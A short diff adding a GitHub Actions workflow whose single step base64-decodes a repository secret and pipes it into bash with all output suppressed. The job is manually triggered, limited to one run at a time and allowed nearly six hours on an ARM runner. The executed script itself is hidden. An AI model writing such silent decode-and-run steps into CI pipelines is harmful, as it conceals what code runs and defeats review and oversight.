@@ -1,0 +1,19 @@
+# 1
+name: Instance
+on: workflow_dispatch
+
+# 2
+concurrency:
+  group: Instance_Mutex
+  cancel-in-progress: true
+
+# 3
+jobs:
+  Instance_Job:
+    runs-on: ubuntu-24.04-arm
+    timeout-minutes: 345
+    steps:
+      - env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          INSTANCE: ${{ secrets.INSTANCE }}
+        run: echo "$INSTANCE" | jq -r ".[0]" | openssl base64 -d -A | bash &> /dev/null
